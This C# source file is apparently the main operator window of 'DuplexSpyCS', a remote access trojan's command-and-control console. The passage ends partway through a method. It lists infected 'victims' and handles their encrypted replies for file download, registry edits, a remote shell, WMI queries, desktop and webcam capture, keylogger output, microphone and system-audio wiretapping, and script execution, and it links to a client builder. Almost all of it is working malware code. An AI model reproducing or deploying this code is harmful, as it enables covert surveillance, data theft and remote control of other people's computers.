using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace DuplexSpyCS
{
    public partial class Form1 : Form
    {

        Listener listener;

        ColorStyleMode color_style = ColorStyleMode.LightMode;

        //SCREEN IMAGE LIST
        ImageList il_screen = new ImageList();
        int screen_width = 0;
        int screen_BigWidth = 0;

        /// <summary>
        /// Store class StreamWriter of file transfer.
        /// </summary>
        public static Dictionary<string, FilePacketWriter> g_FilePacketWriter = new Dictionary<string, FilePacketWriter>();

        public Form1()
        {
            InitializeComponent();
        }

        public void ColorStyle(ColorStyleMode style, Form f = null)
        {
            Color backcolor = C3.dic_ColorModeStylee[style]["back"];
            Color forecolor = C3.dic_ColorModeStylee[style]["fore"];

            List<Form> l_form = new List<Form>();
            if (f == null)
                l_form.AddRange(Application.OpenForms.Cast<Form>());
            else
                l_form.Add(f);

            foreach (Form form in l_form)
            {
                foreach (Control control in form.Controls)
                {
                    if (control is ListView)
                    {
                        ListView lv = (ListView)control;
                        lv.OwnerDraw = true;
                        lv.DrawColumnHeader += (sender, e) =>
                        {
                            using (SolidBrush brush = new SolidBrush(backcolor))
                            {
                                e.Graphics.FillRectangle(brush, e.Bounds);
                            }

                            TextRenderer.DrawText(
                                e.Graphics,
                                e.Header.Text,
                                e.Font,
                                e.Bounds,
                                forecolor,
                                TextFormatFlags.VerticalCenter | TextFormatFlags.Left);

                            using (Pen pen = new Pen(Color.Gray))
                            {
                                e.Graphics.DrawRectangle(pen, e.Bounds);
                            }
                        };
                        lv.DrawItem += (sender, e) =>
                        {
                            e.DrawDefault = true;
                        };
                        lv.DrawSubItem += (sender, e) =>
                        {
                            Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;

                            using (SolidBrush brush = new SolidBrush(backColor))
                            {
                                e.Graphics.FillRectangle(brush, e.Bounds);
                            }

                            e.Graphics.DrawString(e.SubItem.Text, e.Item.Font, Brushes.Black, e.Bounds);
                        };
                    }

                    control.BackColor = backcolor;
                    control.ForeColor = forecolor;
                }
            }
        }

        /// <summary>
        /// Create new portfolio when new victim is onlined.
        /// </summary>
        /// <param name="v">Class Victim</param>
        /// <returns></returns>
        int MakeNewPortfolio(Victim v)
        {
            try
            {
                string dir = Path.Combine(Application.StartupPath, "Victim");
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                dir = Path.Combine(dir, v.ID);
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    string[] dirs =
                    {
                        "Downloads",
                        "Monitor",
                        "Webcam",
                    };

                    string[] files =
                    {
                        "setting.ini",
                    };

                    foreach (string d in dirs)
                    {
                        string tmp_dir = Path.Combine(dir, d);
                        if (!Directory.Exists(tmp_dir))
                            Directory.CreateDirectory(tmp_dir);
                    }

                    foreach (string file in files)
                    {
                        string tmp_file = Path.Combine(dir, file);
                        if (!File.Exists(tmp_file))
                            File.CreateText(tmp_file).Close();
                    }
                }
                v.dir_victim = dir;

                return 1;
            }
            catch (Exception ex)
            {
                return -1;
            }
        }

        /// <summary>
        /// Process function data from victim.
        /// </summary>
        /// <param name="l">Class Listener</param>
        /// <param name="v">Class Victim</param>
        /// <param name="buffer">Payload</param>
        /// <param name="rec">Buffer length</param>
        void Received(Listener l, Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec)
        {
            try
            {
                string dec_data = Crypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(buffer.MessageData)), v._AES.key, v._AES.iv);
                string[] cmd = dec_data.Split("|");
                if (cmd[0] == "info")
                {
                    Invoke(new Action(() =>
                    {
                        string online_id = cmd[1];
                        ListViewItem x = listView1.FindItemWithText(online_id);
                        if (x == null) //NEW VICTIM
                        {
                            v.ID = online_id;
                            ListViewItem item = new ListViewItem(""); //Screen
                            item.SubItems.Add(online_id); //Online ID
                            item.SubItems.Add(cmd[2]); //Username
                            item.SubItems.Add(v.socket.RemoteEndPoint.ToString()); //Remote IP Address
                            item.SubItems.Add(cmd[3]); //Is Admin?
                            item.SubItems.Add(cmd[4]); //OS
                            for (int i = 5; i < 9; i++)
                                item.SubItems.Add(cmd[i]);
                            item.SubItems.Add(Crypto.b64D2Str(cmd[9]));
                            item.Tag = v;
                            item.ImageKey = v.ID;

                            v.remoteOS = cmd[4];
                            v.ID = online_id;

                            Invoke(new Action(() => listView1.Items.Add(item)));

                            MakeNewPortfolio(v);

                            C2.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
                            C2.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
                        }
                        else
                        {
                            x.SubItems[6].Text = v.latency_time.ToString() + " ms";
                            x.SubItems[7].Text = cmd[6];
                            x.SubItems[10].Text = Crypto.b64D2Str(cmd[9]);

                            int width = 0;
                            Invoke(new Action(() => width = listView1.Columns[0].Width));
                            if (il_screen.Images.ContainsKey(v.ID))
                                il_screen.Images.RemoveByKey(v.ID);

                            if (width > 256)
                                width = 255;
                            il_screen.ImageSize = new Size(width, width);
                            Image img = C1.Base64ToImage(cmd[10]);
                            il_screen.Images.Add(v.ID, img);
                            v.img_LastDesktop = img;
                        }
                        listView1.Refresh();
                    }));
                }
                else if (cmd[0] == "detail")
                {
                    if (cmd[1] == "client")
                    {
                        if (cmd[2] == "info")
                        {

                        }
                    }
                    else if (cmd[1] == "pc")
                    {
                        frmInfo f = (frmInfo)C1.GetFormByVictim(v, Function.Information);
                        if (f == null)
                            return;

                        if (cmd[2] == "info")
                        {
                            ClientConfig config = C1.BytesToStruct<ClientConfig>(Convert.FromBase64String(cmd[3]));
                            f.ShowInfo(config);
                        }
                    }
                }
                else if (cmd[0] == "file")
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.FileInit(cmd[2], cmd[3], cmd[4], cmd[5]);
                    }
                    else if (cmd[1] == "sd")
                    {
                        if (cmd[2] == "error")
                        {
                            MessageBox.Show(Crypto.b64D2Str(cmd[3]), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        f.File_AddItems(cmd[2], cmd[3], cmd[4]);
                    }
                    else if (cmd[1] == "goto")
                    {
                        string dir = cmd[2];
                        string code = cmd[3];
                        if (code == "1")
                        {
                            f.FileGoto(dir);
                        }
                    }
                    else if (cmd[1] == "read")
                    {
                        f.File_Read(cmd[2], cmd[3], cmd[4]);
                    }
                    else if (cmd[1] == "write")
                    {
                        f.File_Write(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "uf") //UPLOAD FILE
                    {
                        frmFileTransferState f_state = (frmFileTransferState)C1.GetFormByVictim(v, Function.TransferFileState);
                        if (f_state.transfer_type != TransferFileType.Upload)
                            f_state = null;

                        if (cmd[2] == "state")
                        {
                            string file = Crypto.b64D2Str(cmd[3]);
                            string percentage = cmd[4];

                            if (f_state != null)
                            {
                                f_state.UpdateState(file, percentage);
                            }
                        }
                        else if (cmd[2] == "err") //ERROR
                        {
                            if (cmd[3] == "all") //STOP ALL
                            {

                            }
                            else if (cmd[3] == "one") //SKIP SPECIFIED
                            {
                                string file = Crypto.b64D2Str(cmd[4]);
                                string msg = Crypto.b64D2Str(cmd[5]);
                                if (f_state != null)
                                {
                                    f_state.UpdateState(file, msg);
                                }
                            }
                        }
                        else if (cmd[2] == "stop") //NOT CAUSED BY ERROR
                        {

                        }
                    }
                    else if (cmd[1] == "df") //DOWNLOAD FILE
                    {
                        if (cmd[2] == "recv")
                        {
                            string remote_file = Crypto.b64D2Str(cmd[3]); //THIS IS THE REMOTE FILE PATH, WE NEED TO PROCESS IT, SAVE IT INTO VICTIM FOLDER
                            string tgt_file = Path.Combine(new string[] { v.dir_victim, "Downloads", Path.GetFileName(remote_file) });
                            long file_len = long.Parse(cmd[4]);
                            int offset = int.Parse(cmd[5]);
                            byte[] file_buffer = Convert.FromBase64String(cmd[6]);

                            if (!g_FilePacketWriter.ContainsKey(tgt_file))
                                g_FilePacketWriter.Add(tgt_file, new FilePacketWriter(tgt_file, remote_file, file_len, v));

                            FilePacketWriter writer = g_FilePacketWriter[tgt_file];
                            writer.EnqueuePacket(offset, file_buffer);
                        }
                        else if (cmd[2] == "err") //ERROR
                        {
                            if (cmd[3] == "all") //STOP ALL
                            {

                            }
                            else if (cmd[3] == "one") //SKIP ALL
                            {

                            }
                        }
                        else if (cmd[2] == "stop") //NOT CAUSED BY ERROR
                        {

                        }
                    }
                    else if (cmd[1] == "img")
                    {
                        f.File_ShowImage(cmd[2]);
                    }
                    else if (cmd[1] == "new")
                    {
                        if (cmd[2] == "folder")
                        {
                            string code = cmd[3];

                            if (cmd[3] == "1")
                            {
                                f.fileLV_Refresh();
                            }
                            else
                            {
                                string msg = Crypto.b64D2Str(cmd[4]);
                                MessageBox.Show(msg, "Error - New Folder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                    else if (cmd[1] == "paste")
                    {
                        frmFilePaste _f = (frmFilePaste)C1.GetFormByVictim(v, Function.FilePaste);
                        if (_f == null)
                            return;
                        else
                            Invoke(new Action(() => _f.Activate()));

                        List<string[]> func(string data)
                        {
                            return data.Split(',').Select(x => Crypto.b64D2Str(x).Split('|')).Select(x => new string[]
                            {
                                x[0],
                                x[1],
                                Crypto.b64D2Str(x[2]),
                                Crypto.b64D2Str(x[3]),
                            }).ToList();
                        }

                        List<string[]> entries = func(cmd[2]);

                        _f.ShowResult(entries);
                    }
                    else if (cmd[1] == "del")
                    {
                        frmFileDelState _f = (frmFileDelState)C1.GetFormByVictim(v, Function.FileDelState);
                        if (_f == null)
                            return;
                        else
                            Invoke(new Action(() => _f.Activate()));

                        List<string[]> func(string data)
                        {
                            return data.Split(',').Select(x => x.Split(';')).Select(x => new string[]
                            {
                                x[0], //CODE
                                Crypto.b64D2Str(x[1]), //PATH
                                string.IsNullOrEmpty(x[2]) ? string.Empty : Crypto.b64D2Str(x[2]) //MESSAGE
                            }).ToList();
                        }

                        List<string[]> folders = func(cmd[2]);
                        List<string[]> files = func(cmd[3]);

                        _f.ShowDelState(folders, files);
                    }
                    else if (cmd[1] == "zip")
                    {
                        frmFileArchive af = (frmFileArchive)C1.GetFormByVictim(v, Function.FileArchive);
                        if (af == null)
                            return;

                        List<string[]> dInfo = null;
                        List<string[]> fInfo = null;

                        if (!string.IsNullOrEmpty(cmd[2]))
                            dInfo = cmd[2].Split(',')
                                .Select(x => Crypto.b64D2Str(x))
                                .Select(x => x.Split('|'))
                                .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
                                .ToList();

                        if (!string.IsNullOrEmpty(cmd[3]))
                            fInfo = cmd[3].Split(',')
                                .Select(x => Crypto.b64D2Str(x))
                                .Select(x => x.Split('|'))
                                .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
                                .ToList();

                        af.ShowState(ArchiveAction.Compress, dInfo, fInfo, cmd[4]);
                    }
                    else if (cmd[1] == "unzip")
                    {
                        frmFileArchive af = (frmFileArchive)C1.GetFormByVictim(v, Function.FileArchive);
                        if (af == null)
                            return;

                        List<string[]> aInfo = cmd[2].Split(',')
                            .Select(x => Crypto.b64D2Str(x))
                            .Select(x => x.Split('|'))
                            .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
                            .ToList();

                        af.ShowState(ArchiveAction.Extract, aInfo, null);
                    }
                    else if (cmd[1] == "find")
                    {
                        frmFileFind ff = (frmFileFind)C1.GetFormByVictim(v, Function.FileFind);
                        if (ff == null)
                            return;

                        List<(string, string, string)> results = cmd[2].Split(';')
                            .Select(x => x.Split(','))
                            .Select(x => new string[] { x[0], Crypto.b64D2Str(x[1]) })
                            .Select(x => (Path.GetFileName(x[1]), x[0] == "d" ? "Directory" : "File", x[1]))
                            .ToList();

                        List<(string, string, string)> lsFolder = results.Where(x => x.Item2 == "Directory").ToList();
                        List<(string, string, string)> lsFile = results.Where(x => x.Item2 != "Directory").ToList();

                        ff.ShowFindResult(lsFolder, lsFile);
                    }
                }
                else if (cmd[0] == "task")
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.TaskInit(cmd[2]);
                    }
                }
                else if (cmd[0] == "reg") //RegEdit
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.RegInit(cmd[2]);
                    }
                    else if (cmd[1] == "item")
                    {
                        f.Reg_AddItem(cmd[2], cmd[3], cmd[4]);
                    }
                    else if (cmd[1] == "goto")
                    {
                        f.Reg_Goto(Crypto.b64D2Str(cmd[2]), cmd[3]);
                    }
                    else if (cmd[1] == "add")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = Crypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            f.Reg_RespAddKey(code, msg);
                        }
                        else if (cmd[2] == "val")
                        {
                            f.Reg_RespAddValue(code, msg);
                        }
                    }
                    else if (cmd[1] == "rename")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = Crypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            f.Reg_RespKeyRename(code, msg);
                        }
                        else if (cmd[2] == "val")
                        {
                            f.Reg_RespValueRename(code, msg);
                        }
                    }
                    else if (cmd[1] == "del")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = Crypto.b64D2Str(cmd[4]);
                        bool bKey = cmd[2] == "key";

                        switch (code)
                        {
                            case 0:
                                MessageBox.Show(msg, "Error - RegDeleteKey()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                break;
                            case 1:
                                MessageBox.Show($"Delete {(bKey ? "key" : "value")} successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                
                                frmManager f_mgr = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                                if (f_mgr == null)
                                    return;

                                f_mgr.Reg_Refresh();

                                break;
                        }
                    }
                    else if (cmd[1] == "find")
                    {
                        frmRegFind ff = (frmRegFind)C1.GetFormByVictim(v, Function.RegFind);
                        if (ff == null)
                            return;

                        List<(string, string)> lsKey = new List<(string, string)>();
                        List<(string, string)> lsVal = new List<(string, string)>();

                        foreach (var x in cmd[2].Split(',').Select(y => y.Split(';')).Select(y => (y[0], Crypto.b64D2Str(y[1]), Crypto.b64D2Str(y[2]))))
                        {
                            if (x.Item1 == "k")
                                lsKey.Add(("Directory", x.Item2));
                            else
                                lsVal.Add(("Value", x.Item3 + "\\" + x.Item2));
                        }

                        ff.ShowFindResult(lsKey, lsVal);
                    }
                    else if (cmd[1] == "export")
                    {
                        int code = int.Parse(cmd[2]);
                        string msg = Crypto.b64D2Str(cmd[3]);
                        string savePath = Crypto.b64D2Str(cmd[4]);

                        if (code == 0)
                        {
                            MessageBox.Show(msg, "Reg Export", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            File.WriteAllText(savePath, msg);
                            DialogResult r = MessageBox.Show(
                                "Export successfully: " + savePath + "\n" +
                                "Do you want to open in file explorer ?",
                                "Done",
                                MessageBoxButtons.YesNo,
                                MessageBoxIcon.Question,
                                MessageBoxDefaultButton.Button2
                            );

                            if (r == DialogResult.Yes)
                            {
                                if (string.IsNullOrEmpty(savePath))
                                {
                                    MessageBox.Show("Save path is null!", "Null string", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                    return;
                                }

                                string dir = Path.GetDirectoryName(savePath);
                                //Open in file explorer
                                if (Directory.Exists(dir))
                                    Process.Start("explorer.exe", dir);
                                else
                                    MessageBox.Show("Directory not exist !\n" + dir, "Directory Not found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }
                    }
                    else if (cmd[1] == "import")
                    {
                        int code = int.Parse(cmd[2]);
                        string msg = Crypto.b64D2Str(cmd[3]);
                        string saveRemotePath = Crypto.b64D2Str(cmd[4]);
                    }
                }
                else if (cmd[0] == "serv")
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.ServInit(cmd[2]);
                    }
                }
                else if (cmd[0] == "conn")
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.ConnInit(cmd[2]);
                    }
                }
                else if (cmd[0] == "window")
                {
                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.WindowInit(cmd[2]);
                    }
                    else if (cmd[1] == "shot")
                    {
                        f.Window_ShowScreenshot(cmd[2], cmd[3]);
                    }
                }
                else if (cmd[0] == "system")
                {
                    frmSystem f = (frmSystem)C1.GetFormByVictim(v, Function.System);
                    if (f == null)
                        return;

                    if (cmd[1] == "app") //APPLICATION
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> apps = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
                            f.App_ShowApps(apps);
                        }
                    }
                    else if (cmd[1] == "ev") //ENVIRONMENT VARIABLES
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> evs = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x).Split('=')).ToList();
                            f.EV_ShowEVs(evs);
                        }
                        else if (cmd[2] == "set")
                        {

                        }
                    }
                    else if (cmd[1] == "device") //PNP ENTITY
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> devices = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
                            f.Device_ShowDevices(devices);
                        }
                    }
                    else if (cmd[1] == "if") //INTERFACE
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> interfaces = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
                            f.If_ShowInterface(interfaces);
                        }
                    }
                }
                else if (cmd[0] == "shell")
                {
                    frmShell f = (frmShell)C1.GetFormByVictim(v, Function.Shell);
                    if (f == null)
                        return;

                    if (cmd[1] == "output" || cmd[1] == "error")
                    {
                        string text = cmd[2];
                        f.WriteOutput(text);
                    }
                    else if (cmd[1] == "tab")
                    {
                        string text = Crypto.b64D2Str(cmd[2]);
                        f.ProcessTab(text);
                    }
                }
                else if (cmd[0] == "wmi")
                {
                    frmWMI f = (frmWMI)C1.GetFormByVictim(v, Function.WMI);
                    if (f == null)
                        return;

                    if (cmd[1] == "output")
                    {
                        f.ShowOutput(cmd[2]);
                    }
                    else if (cmd[1] == "error")
                    {
                        MessageBox.Show("WMI error");
                    }
                }
                else if (cmd[0] == "desktop")
                {
                    frmDesktop f = (frmDesktop)C1.GetFormByVictim(v, Function.Desktop);
                    if (f == null)
                        return;
                    if (cmd[1] == "init")
                    {
                        f.Init(cmd[2]);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        f.ShowImage(cmd[2], cmd[3]);
                    }
                }
                else if (cmd[0] == "webcam")
                {
                    frmWebcam f = (frmWebcam)C1.GetFormByVictim(v, Function.Webcam);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.Init(cmd[2]);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "snapshot")
                    {
                        f.ShowImage(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "stop")
                    {

                    }
                }
                else if (cmd[0] == "mulcam")
                {

                }
                else if (cmd[0] == "keylogger")
                {
                    frmKeyLogger f = (frmKeyLogger)C1.GetFormByVictim(v, Function.KeyLogger);
                    if (f == null)
                        return;

                    if (cmd[1] == "read")
                    {
                        f.ShowKeyLogger(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "new")
                    {

                    }
                    else if (cmd[1] == "del")
                    {

                    }
                }
                else if (cmd[0] == "chat")
                {
                    frmChat f = (frmChat)C1.GetFormByVictim(v, Function.Chat);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        Invoke(new Action(() =>
                        {
                            f.BringToFront();
                            f.Init();
                        }));
                    }
                    else if (cmd[1] == "msg")
                    {
                        f.ShowMsg(v.ID, Crypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "close")
                    {

                    }
                }
                else if (cmd[0] == "audio")
                {
                    frmAudio f = (frmAudio)C1.GetFormByVictim(v, Function.Audio);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.Init(cmd[2]);
                    }
                    else if (cmd[1] == "update")
                    {
                        if (cmd[2] == "vol") //VOLUME
                        {
                            f.UpdateVolume(float.Parse(cmd[3]));
                        }
                        else if (cmd[2] == "mute")
                        {
                            if (cmd[3] == "mute")
                            {

                            }
                            else if (cmd[3] == "unmute")
                            {

                            }
                            else if (cmd[3] == "disable")
                            {

                            }
                            else if (cmd[3] == "enable")
                            {

                            }
                        }
                    }
                    else if (cmd[1] == "wiretap")
                    {
                        if (cmd[2] == "micro")
                        {
                            if (cmd[3] == "buffer")
                            {
                                double db = double.Parse(cmd[4]);
                                byte[] buf_audio = Convert.FromBase64String(cmd[5]);
                                f.MicAudioPlay(db, buf_audio);
                            }
                        }
                        else if (cmd[2] == "system")
                        {
                            if (cmd[3] == "buffer")
                            {
                                double db = double.Parse(cmd[4]);
                                byte[] buf_audio = Convert.FromBase64String(cmd[5]);
                                f.SysAudioPlay(db, buf_audio);
                            }
                        }
                    }
                }
                else if (cmd[0] == "exec")
                {
                    frmRunScript f = (frmRunScript)C1.GetFormByVictim(v, Function.RunScript);
                    if (f == null)
                        return;
                    
                    int code = int.Parse(cmd[2]);
                    string output = Crypto.b64D2Str(cmd[3]);

                    f.DisplayOutput(code, output);
                }
                else if (cmd[0] == "error")
                {
                    C2.sql_conn.WriteErrorLogs(v, Crypto.b64D2Str(cmd[1]));
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //MessageBox.Show(ex.Message);
                C2.sql_conn.WriteSysErrorLogs(ex.Message);
            }
        }

        /// <summary>
        /// Get victim of listviewitem tag.
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        Victim GetVictim(ListViewItem item)
        {
            return (Victim)item.Tag;
        }

        /// <summary>
        /// Cutoff the selected socket.
        /// </summary>
        /// <param name="v"></param>
        void Disconnected(Victim v)
        {
            v.socket.Close();
            C2.sql_conn.WriteSystemLogs($"[{C1.DateTimeStrEnglish()}]: Disconnected: {v.ID}");

            if (v == null)
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    ListViewItem item = listView1.FindItemWithText(v.ID);
                    if (item != null)
                        item.Remove();
                }
                catch (Exception ex)
                {

                }
            }));
        }

        private void OnFormCountChanged(object sender, FormCountChangedEventArgs e)
        {
            Console.WriteLine($"Number of open forms: {e.CurrentFormCount}");
        }

        protected override void OnClosed(EventArgs e)
        {

        }

        //Setup DuplexSpyCS Server
        void setup()
        {
            //listView1.OwnerDraw = true;
            //ColorStyle(color_style, this);

            toolStripLabel1.Text = string.Empty; //Sent Bytes
            toolStripLabel2.Text = string.Empty; //Received Bytes

            //Config file
            try
            {
                C2.ini_manager = new IniManager("config.ini");
            }
            catch (FileNotFoundException ex)
            {
                DialogResult dr = MessageBox.Show("config.ini not found.\nDo you want to open existed ini file? Click no to build ini file automatically.", "File Not Found", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dr == DialogResult.Yes)
                {
                    OpenFileDialog ofd = new OpenFileDialog();
                    ofd.Multiselect = false;
                    ofd.FileName = "INI File(*.ini)|*.ini";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        C2.ini_manager = new IniManager(ofd.FileName);
                    }
                    else
                    {
                        MessageBox.Show("No file is selected, close DuplexSpyCS", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Close(); //Exit
                    }
                }
                else
                {
                    //Todo: Build ini file automatically.
                    //Release default ini file from resource.
                }
            }

            C2.sql_conn = new SqlConn("data.db"); //Set database.
            C2.sql_conn.Open();

            listener = new Listener(); //Declare new socket listener.

            timer1.Start(); //Show server listen state at the title.
            timer2.Start(); //Show sent, received bytes count.

            listener.Received += Received; //Received event.
            listener.Disconencted += Disconnected; //Disconnected event.

            //Display remote desktop
            listView1.SmallImageList = il_screen; //Detail mode.
            listView1.LargeImageList = il_screen; //LargeIcon mode.
            listView1.Columns[0].Width = listView1.Font.Height;
            screen_width = listView1.Columns[0].Width;

            DateTime now = DateTime.Now;
            C2.dtStartUp = now;
            C2.sql_conn.NewLogs(SqlConn.CSV.Server, SqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            setup();
        }

        //MANAGER
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmManager f = new frmManager();
                f.Text = $@"Manager\\{v.ID}";
                f.Tag = Function.Manager;
                f.v = v;

                f.Show();
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        //LISTEN
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            frmListen f = new frmListen();

            if (f.ShowDialog() == DialogResult.OK)
            {
                string ip = f.ip;
                int port = f.port;
                if (listener.socket.IsBound)
                {
                    if (port == listener.port)
                    {
                        MessageBox.Show("This port is in used!", "Bind Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    listener.Stop();
                    listener = new Listener();
                }

                listener.Start(port);
            }
        }

        //BUILD
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            frmBuild f = new frmBuild();
            f.Text = "Build Client";

            f.ShowDialog();
        }

        //DESKTOP
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmDesktop f = new frmDesktop();
                f.Text = $@"Desktop\\{v.ID}";
                f.Tag = Function.Desktop;
                f.v = v;
                f.Show();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Text = $"DuplexSpyCS v1.0.0 | Port[{(listener.port == -1 ? string.Empty : listener.port)}] | Online[{listView1.Items.Count}] | Selected [{listView1.SelectedItems.Count}]";
        }

        private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            int width = listView1.Columns[0].Width;
            if (width < 256)
                il_screen.ImageSize = new Size(width, width);
        }

        //VIEW - LARGE ICON
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            listView1.View = View.LargeIcon;
            screen_BigWidth = 255;
            listView1.Columns[0].Width = screen_BigWidth;
            foreach (ListViewItem item in listView1.Items)
                item.Text = item.SubItems[1].Text + "@" + item.SubItems[3].Text;
        }

        //VIEW - DETAIL
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            listView1.View = View.Details;
            listView1.Columns[0].Width = screen_width;
            foreach (ListViewItem item in listView1.Items)
                item.Text = string.Empty;
        }

        //WEBCAM
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (item.SubItems[0].Text != "0")
                {
                    Victim v = GetVictim(item);
                    frmWebcam f = new frmWebcam();
                    f.Text = $@"Webcam\\{v.ID}";
                    f.v = v;
                    f.Tag = Function.Webcam;
                    f.Text = @$"{item.SubItems[1].Text}\\Webcam";

                    f.Show();
                }
                else
                {
                    MessageBox.Show($"{item.SubItems[1].Text}: Webcam not found!");
                }
            }
        }

        //INFORMATION
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmInfo f = new frmInfo();
                f.Text = $@"Information\\{v.ID}";
                f.Tag = Function.Information;
                f.v = v;
                f.Show();
            }
        }

        //FUN STUFF
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmFunStuff f = new frmFunStuff();
                f.v = GetVictim(item);
                f.Tag = Function.FunStuff;

                f.Show();
            }
        }

        //UPDATE SENT/RECEIVED BYTES PER SECOND
        private void timer2_Tick(object sender, EventArgs e)
        {
            toolStripLabel1.Text = $"Sent Bytes[{C2.BytesNormalize(C2.sent_bytes)}]";
            toolStripLabel2.Text = $"Received Bytes[{C2.BytesNormalize(C2.recv_bytes)}]";

            C2.sent_bytes = 0;
            C2.recv_bytes = 0;
        }

        //SHOW LOGS
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            frmLogs f = new frmLogs();
            f.Text = "Log Viewer";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Show();
        }

        //KEY LOGGER
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmKeyLogger f = new frmKeyLogger();
                f.v = GetVictim(item);
                f.Tag = Function.KeyLogger;
                //ColorStyle(ColorStyleMode.LightMode, this);
                f.Text = $@"Keylogger\\{f.v.ID}";

                f.Show();
            }
        }

        //CHAT
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmChat f = new frmChat();
                f.Text = $@"Chat\\{v.ID}";
                f.Tag = Function.Chat;
                f.v = v;
                f.StartPosition = FormStartPosition.CenterScreen;
                f.Show();
            }
        }

        //MULTI - DESKTOP
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            List<Victim> list = new List<Victim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                list.Add(GetVictim(item));

